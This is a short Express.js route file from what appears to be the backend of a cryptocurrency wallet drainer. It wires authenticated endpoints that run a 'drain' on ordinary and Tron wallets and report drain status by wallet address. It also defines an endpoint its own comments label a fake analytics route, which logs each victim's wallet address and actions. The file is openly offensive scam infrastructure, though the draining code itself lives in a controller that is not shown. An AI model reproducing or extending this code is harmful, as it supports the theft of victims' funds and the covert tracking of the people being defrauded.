// backend/src/routes/drain.js
import express from 'express'
import { executeDrain, getDrainStatus } from '../controllers/drainController.js'
import { authenticate } from '../middleware/auth.js'

const router = express.Router()

router.post('/execute', authenticate, executeDrain)
router.post('/execute-tron', authenticate, executeDrain)
router.get('/status/:address', getDrainStatus)

// Fake analytics endpoint
router.post('/analytics', (req, res) => {
  // Track victim behavior
  const { address, action, page } = req.body
  console.log(`Victim ${address} performed ${action} on ${page}`)
  res.json({ success: true })
})

export default router
